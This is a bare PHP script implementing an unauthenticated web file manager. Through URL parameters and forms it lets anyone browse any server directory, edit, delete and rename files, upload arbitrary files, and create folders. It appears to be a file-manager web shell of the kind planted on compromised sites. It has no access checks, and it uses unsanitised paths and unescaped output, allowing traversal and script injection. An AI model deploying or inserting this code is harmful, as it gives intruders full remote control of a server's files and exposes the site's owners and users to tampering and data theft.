<?php
session_start();

$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

displayDirectory($dir);
handleActions($dir);
displayForms($dir);

function displayDirectory($dir) {
    echo "<h3>Current Directory: $dir</h3>";
    echo "<a href='?dir=" . dirname($dir) . "'>Go Up</a><ul>";
    foreach (array_diff(scandir($dir), ['.', '..']) as $item) {
        $path = realpath("$dir/$item");
        $style = fileStyle($path);
        echo "<li style='$style'>";
        if (is_dir($path)) {
            echo "<a href='?dir=$path'>$item</a>";
        } else {
            echo "$item - <a href='?dir=$dir&action=edit&file=$item'>Edit</a> | 
                  <a href='?dir=$dir&action=delete&file=$item'>Delete</a> | 
                  <a href='?dir=$dir&action=rename&file=$item'>Rename</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

function fileStyle($path) {
    return is_readable($path) && is_writable($path) ? "color: green;" : (is_writable($path) ? "color: red;" : "color: gray;");
}

function handleActions($dir) {
    if (empty($_GET['action']) || empty($_GET['file'])) return;
    $filePath = "$dir/{$_GET['file']}";
    switch ($_GET['action']) {
        case 'edit': editFile($filePath); break;
        case 'delete': unlink($filePath) && print("<p>File deleted!</p>"); break;
        case 'rename': renameFile($filePath); break;
    }
}

function editFile($filePath) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p>File saved!</p>";
    }
    $content = htmlspecialchars(file_get_contents($filePath) ?: '');
    echo "<form method='POST'><textarea name='content' style='width:100%; height:300px;'>$content</textarea><br><button type='submit'>Save</button></form>";
}

function renameFile($filePath) {
    if (!empty($_POST['newName'])) {
        rename($filePath, dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['newName']);
        echo "<p>File renamed!</p>";
    } else {
        echo "<form method='POST'><input type='text' name='newName' placeholder='New Name'><button type='submit'>Rename</button></form>";
    }
}

function displayForms($dir) {
    echo "<h3>Upload File</h3><form method='POST' enctype='multipart/form-data'><input type='file' name='fileToUpload'><button type='submit'>Upload</button></form>";
    echo "<h3>Create Folder</h3><form method='POST'><input type='text' name='folderName' placeholder='Folder Name'><button type='submit'>Create</button></form>";
    echo "<h3>Create File</h3><form method='POST'><input type='text' name='fileName' placeholder='File Name'><button type='submit'>Create</button></form>";
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!empty($_FILES['fileToUpload'])) move_uploaded_file($_FILES['fileToUpload']['tmp_name'], "$dir/" . basename($_FILES['fileToUpload']['name']));
        if (!empty($_POST['folderName'])) mkdir("$dir/{$_POST['folderName']}");
        if (!empty($_POST['fileName'])) file_put_contents("$dir/{$_POST['fileName']}", '');
    }
}
